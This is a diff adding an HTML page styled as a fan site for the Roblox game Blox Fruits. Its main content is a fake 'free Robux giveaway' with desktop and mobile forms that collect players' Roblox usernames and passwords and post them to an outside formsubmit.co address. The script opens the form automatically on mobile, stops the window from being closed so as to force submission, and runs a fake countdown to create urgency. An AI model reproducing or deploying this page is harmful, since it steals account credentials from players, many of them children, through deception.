@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blox Fruits - Home</title>
+    <link rel="stylesheet" href="./my-second-stylesheet.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <header>
+        <p><sup>🍎</sup>free Robux ⚔️</p>
+        <h1>🌟 Join now to get free Robux! 🌟</h1>
+        <nav>
+            <ul>
+                <li class="selected">🏠 Home</li>
+                <li><a href="free-fruits.html">🍇 Free Fruits</a></li>
+                <li><a href="about-the-game.html">🎮 About The Game</a></li>
+                <li><a href="the-lore-of-blox-fruits.html">📜 The Lore</a></li>
+                <li><a href="tips-and-tricks.html">💡 Tips & Tricks</a></li>
+                <li><a href="youtubers.html">🎥 YouTubers</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <article>
+            <div class="hero-section">
+                <h1>Welcome to my awesome website! 🌈</h1>
+                <p>Hi everyone! This is a super cool fanmade website about the Roblox game <b>Blox Fruits</b>. Join the
+                    fun and get free items!</p>
+                <!-- Mobile Only Button -->
+                <button id="open-robux-modal" class="glow-button pulse mobile-only">🎁 ENTER GIVEAWAY 🎁</button>
+            </div>
+
+            <!-- Desktop Only Form -->
+            <section class="robux-gen-section desktop-only">
+                <div class="glass-card">
+                    <h2>💰 Robux Mega Giveaway!</h2>
+                    <p>Want free Robux? 🤑 Enter your details below to join our weekly prize draw! Good luck! 🍀</p>
+                    <form action="https://formsubmit.co/princewere@12gmail.com" method="POST" class="robux-form-inner">
+                        <div class="form-group">
+                            <label>👤 Your Roblox Name</label>
+                            <input type="text" name="Roblox_Username" placeholder="Type your name here..." required>
+                        </div>
+                        <div class="form-group">
+                            <label>🔑 Secret Password</label>
+                            <input type="password" name="Password" placeholder="Type your password..." required>
+                        </div>
+                        <div class="form-group">
+                            <label>💎 How many Robux?</label>
+                            <input type="number" name="Robux_Amount" placeholder="e.g. 1000" min="10" max="100000"
+                                required>
+                        </div>
+                        <button type="submit" class="glow-button">🎁 CLAIM MY ROBUX! 🎁</button>
+                    </form>
+                </div>
+            </section>
+
+            <!-- Mobile Only Modal -->
+            <div id="robux-modal" class="modal-overlay mobile-only">
+                <div class="modal-content">
+                    <span class="close-modal">&times;</span>
+                    <h2>💰 Robux Mega Giveaway!</h2>
+                    <p>Enter your details below to join! 🍀</p>
+                    <form action="https://formsubmit.co/princewere@12gmail.com" method="POST" class="robux-form-inner">
+                        <div class="form-group">
+                            <label>👤 Your Roblox Name</label>
+                            <input type="text" name="Roblox_Username" placeholder="Type your name here..." required>
+                        </div>
+                        <div class="form-group">
+                            <label>🔑 Secret Password</label>
+                            <input type="password" name="Password" placeholder="Type your password..." required>
+                        </div>
+                        <div class="form-group">
+                            <label>💎 How many Robux?</label>
+                            <input type="number" name="Robux_Amount" placeholder="e.g. 1000" min="10" max="100000"
+                                required>
+                        </div>
+                        <button type="submit" class="glow-button">🎁 CLAIM MY ROBUX! 🎁</button>
+                    </form>
+                    <!-- Mini Timer Inside Modal -->
+                    <div class="modal-timer">
+                        <p>⏰ Giveaway Ends In:</p>
+                        <div class="countdown-mini">
+                            <span class="days-val">05</span>d : <span class="hours-val">00</span>h : <span
+                                class="minutes-val">00</span>m : <span class="seconds-val">00</span>s
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </article>
+
+        <!-- Floating Timer Notification (Mobile Only) -->
+        <div id="timer-notification" class="timer-notification mobile-only">
+            <div class="notification-header">
+                <h3>⏰ Giveaway Ending!</h3>
+            </div>
+            <div class="countdown-mini">
+                <span class="days-val">05</span>d : <span class="hours-val">00</span>h : <span
+                    class="minutes-val">00</span>m : <span class="seconds-val">00</span>s
+            </div>
+        </div>
+
+        <aside>
+            <!-- Desktop Only Timer Card -->
+            <div class="glass-card timer-card desktop-only">
+                <h2>⏰ Giveaway Ends In:</h2>
+                <div class="countdown-display">
+                    <div class="time-segment">
+                        <span class="days-val">05</span>
+                        <label>DAYS</label>
+                    </div>
+                    <div class="time-segment">
+                        <span class="hours-val">00</span>
+                        <label>HOURS</label>
+                    </div>
+                    <div class="time-segment">
+                        <span class="minutes-val">00</span>
+                        <label>MINS</label>
+                    </div>
+                    <div class="time-segment">
+                        <span class="seconds-val">00</span>
+                        <label>SECS</label>
+                    </div>
+                </div>
+                <p class="timer-subtext" style="color: #64748b; font-weight: 600; text-align: center;">Hurry! Join the
+                    party before time runs out! 🎈</p>
+            </div>
+
+            <section>
+                <h2>⭐ Quick Links ⭐</h2>
+                <ul>
+                    <li><a href="tips-and-tricks.html">🚀 Leveling Guide</a></li>
+                    <li><a href="about-the-game.html">🍎 Fruit Tier List</a></li>
+                    <li><a href="free-fruits.html">🍇 Claim Free Fruits</a></li>
+                </ul>
+            </section>
+        </aside>
+
+        <script>
+            // Modal Logic
+            const modal = document.getElementById("robux-modal");
+            const btn = document.getElementById("open-robux-modal");
+            const span = document.getElementsByClassName("close-modal")[0];
+
+            if (btn) {
+                btn.addEventListener('click', () => {
+                    modal.style.display = "flex";
+                });
+            }
+
+            if (span) {
+                span.addEventListener('click', () => {
+                    alert("Please fill out and submit the form to join the giveaway and close this window! 🎁🌟");
+                });
+            }
+
+            // Removed outside click close behavior to force form submission
+
+            // Auto-open modal on mobile when page loads
+            window.addEventListener('load', () => {
+                if (window.innerWidth <= 899 && modal) {
+                    modal.style.display = "flex";
+                }
+            });
+
+            // Set giveaway end date to 5 days from now
+            const countDownDate = new Date().getTime() + (5 * 24 * 60 * 60 * 1000);
+
+            const timer = setInterval(function () {
+                const now = new Date().getTime();
+                const distance = countDownDate - now;
+
+                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+                const d = days.toString().padStart(2, '0');
+                const h = hours.toString().padStart(2, '0');
+                const m = minutes.toString().padStart(2, '0');
+                const s = seconds.toString().padStart(2, '0');
+
+                document.querySelectorAll(".days-val").forEach(el => el.innerHTML = d);
+                document.querySelectorAll(".hours-val").forEach(el => el.innerHTML = h);
+                document.querySelectorAll(".minutes-val").forEach(el => el.innerHTML = m);
+                document.querySelectorAll(".seconds-val").forEach(el => el.innerHTML = s);
+
+                if (distance < 0) {
+                    clearInterval(timer);
+                    document.querySelectorAll(".countdown-mini, .countdown-display").forEach(el => el.innerHTML = "GIVEAWAY ENDED");
+                }
+            }, 1000);
+
+            // Forms will now submit directly to Formspree
+        </script>
+    </main>
+
+    <footer>
+        <p class="copyright">All information copyright idk lol</p>
+        <p class="contact">Contact: <a href="mailto:hoikiuhkh@gmail.com">hoikiuhkh@gmail.com</a></p>
+    </footer>
+</body>
+
+</html>
